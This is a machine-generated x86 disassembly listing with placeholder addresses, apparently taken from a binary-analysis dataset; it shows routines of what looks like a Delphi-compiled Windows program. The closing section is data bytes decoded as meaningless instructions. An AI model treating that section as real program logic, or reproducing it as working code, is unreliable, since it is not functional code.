mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407fd4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41d5a0
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
sub_41d5a0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_417570
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407fd4
test al al
jne r-xdata
sub_41d5f0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404444
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_408124
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
xor edx edx
mov eax ebx
call sub_41d770
mov edx esi
mov eax ebx
call sub_41d67c
mov dl 0x1
mov eax ebx
call sub_41d770
sub_41d690
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_417570
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4174fc
sub_41d6cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4175cc
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_417460
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_4175ec
sub_41d720
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41d6bc
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41d690
mov cl 0x1
mov edx ebx
call sub_41d720
inc edi
dec ebp
jne r-xdata
sub_41d770
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4042d4
mov edx esp
mov eax esi
call sub_4035bc
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41d7b8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41d7e0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41d828
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41d868
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41d888
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41d8ac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41d8f4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
mov edx esi
call sub_41db24
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41d95c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41db24
mov edx ebx
mov eax esi
call sub_41db18
sub_41d9a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41d9e4
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41d0e4
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41d398
jmp r-xdata
mov eax esi
call sub_417658
mov edx eax
mov eax edi
call sub_41db24
lea eax [ edi + 0x50 ]
call sub_40d18c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_41da44
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41d3b4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41da70
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41da8c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41daa8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_417570
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41db24
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_417460
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_417570
cmp ebp eax
jne r-xdata
sub_41db64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41d398
mov edx ebx
call sub_41d168
sub_41db90
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41dbd8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4032e8
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41dc10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41dc5f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41dc78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41dcc7
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41dce0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41dd4a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41dd64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41ddad
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41936c
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41ddc8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_40599c
xor eax eax
push ebp
push sub_41dfb5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41df8e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40276c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41df7d
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40278c
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403b20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfbc
lea eax [ ebp + 0xc ]
call sub_405928
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403b20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41dff8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41e05b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41e08c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4178dc
mov edi eax
xor eax eax
push ebp
push sub_41e0e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0e8
mov eax [ rw-data ]
call sub_417940
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_417570
call sub_4032e8
inc esi
dec ebx
jne r-xdata
sub_41e100
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41e128
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_402968
mov edx sub_41e100
lea eax [ esi + 0x5 ]
call sub_41e120
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41e120
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41e1e4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406d30
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e128
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41e298
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41e1c0
sub_41e2c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41e364
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e36b
retn
mov eax [ rw-data ]
call sub_416d60
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41e08c
xor edx edx
xor eax eax
call sub_41a2bc
mov eax rw-data
call sub_40d18c
call sub_406058
lea eax [ eax + 0xc ]
call sub_40d18c
mov eax rw-data
call sub_40d18c
mov eax rw-data
call sub_405928
mov eax sub_41e0f8
call sub_4057c4
mov eax rw-data
call sub_40d18c
call sub_41ceb8
mov eax rw-data
call sub_40d18c
mov eax rw-data
call sub_405928
sub_41e370
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41e3f9
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e400
retn
call sub_41ce84
mov eax sub_41e0f8
call sub_4057bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cecc
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405940
mov dl 0x1
mov eax [ r-xdata ]
call sub_41665c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417784
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417784
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41e439
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + 0x680000ff ] cl
xchg [ edi ] al
jo r-xdata
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx - 0x1 ] dh
add [ eax ] al
push 0x72004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx - 0x1 ] dh
add [ eax ] al
push 0x74004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x76004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
push 0x78004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
push 0x7a004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
push 0x7c004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x60004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x62004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x64004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x66004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x68004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x50004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x52004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x54004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x56004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x58004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x40004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x42004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x44004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x46004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
push 0x48004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x30004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx ] dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx ] dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx ] dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] dh
add [ eax ] al
push 0x35004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi ] dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi ] dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ eax ] bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx ] bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx ] bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx ] bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi ] bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi ] bh
inc [ eax ]
